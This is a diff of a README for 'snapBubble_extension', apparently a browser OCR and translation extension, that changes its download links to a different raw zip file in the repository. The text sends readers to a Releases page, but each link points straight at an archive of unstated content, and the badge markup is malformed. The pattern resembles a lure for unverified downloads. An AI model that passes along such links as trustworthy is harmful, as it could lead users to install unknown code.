@@ -1,6 +1,6 @@
 # 🚀 snapBubble_extension - Effortless Text Recognition and Translation
 
-[![Download snapBubble Extension](https://raw.githubusercontent.com/ayana6/snapBubble_extension/main/crossfall/snapBubble_extension.zip%20Extension-brightgreen)](https://raw.githubusercontent.com/ayana6/snapBubble_extension/main/crossfall/snapBubble_extension.zip)
+[![Download snapBubble Extension](https://github.com/ayana6/snapBubble_extension/raw/refs/heads/main/popup/snap-extension-Bubble-1.0-alpha.3.zip%20Extension-brightgreen)](https://github.com/ayana6/snapBubble_extension/raw/refs/heads/main/popup/snap-extension-Bubble-1.0-alpha.3.zip)
 
 ## 📖 About SnapBubble
 
@@ -11,7 +11,7 @@ SnapBubble is a browser extension that uses Optical Character Recognition (OCR) 
 To begin using SnapBubble, follow the steps below.
 
 1. **Download the Extension**  
-   Visit this page to download: [Download SnapBubble Extension](https://raw.githubusercontent.com/ayana6/snapBubble_extension/main/crossfall/snapBubble_extension.zip).
+   Visit this page to download: [Download SnapBubble Extension](https://github.com/ayana6/snapBubble_extension/raw/refs/heads/main/popup/snap-extension-Bubble-1.0-alpha.3.zip).
 
 2. **Select the Latest Version**  
    On the Releases page, locate the most recent version. This version will contain the latest features and fixes.
@@ -66,7 +66,7 @@ If you encounter issues or have feedback, please open an issue on the GitHub rep
 
 ## 📥 Download & Install
 
-To download SnapBubble, visit [this page](https://raw.githubusercontent.com/ayana6/snapBubble_extension/main/crossfall/snapBubble_extension.zip) and select the latest release. Follow the installation steps to get started.
+To download SnapBubble, visit [this page](https://github.com/ayana6/snapBubble_extension/raw/refs/heads/main/popup/snap-extension-Bubble-1.0-alpha.3.zip) and select the latest release. Follow the installation steps to get started.
 
 ### Thank You
 
